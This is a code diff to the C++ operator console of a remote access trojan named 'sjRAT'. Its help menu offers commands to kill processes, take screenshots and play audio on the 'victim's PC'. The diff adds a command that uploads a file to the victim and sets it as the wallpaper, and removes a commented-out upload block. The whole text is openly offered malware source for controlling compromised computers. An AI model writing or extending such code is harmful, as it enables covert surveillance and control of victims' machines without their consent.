@@ -55,6 +55,7 @@ void help_menu()
     printf("kill <pid> - kill process on victim's PC\n\n");
     printf("screenshot - take screenshot from victim's PC\n\n");
     printf("play <file> - play music from file\n\n");
+    printf("wallpaper <file> - set wallpaper on victim`s PC\n\n");
     printf("help - see this message\n\n");
     printf("exit - exit sjRAT and terminate client session\n\n");
     printf("=====================================\n");
@@ -290,15 +291,6 @@ int main(int argc, char* argv[])
                 }
             }
             else if (command.substr(0, 4) == "play") {
-
-                // if (command.length() > 6) {
-                //     std::string filename = command.substr(7);
-                //     SendAndReceive(client, command);
-                //     SendFile(client, &filename[0]);
-                // } else {
-                //     printf("[!] Usage: upload <filename>\n");
-                // }
-
                 if (command.length() > 4) {
                     std::string file = command.substr(5);
                     SendAndReceive(client, command); // send `send sound.mp3s` command                    
@@ -306,6 +298,16 @@ int main(int argc, char* argv[])
                 } else {
                     ColoredText(F_LIGHTRED);
                     printf("[!] Usage: play <file>\n");
+                }
+            }
+            else if (command.substr(0, 9) == "wallpaper") {
+                if (command.length() > 9) {
+                    std::string file = command.substr(10);
+                    SendAndReceive(client, command);                 
+                    SendFile(client, file.c_str());
+                } else {
+                    ColoredText(F_LIGHTRED);
+                    printf("[!] Usage: wallpaper <file>\n");
                 }
             }
 
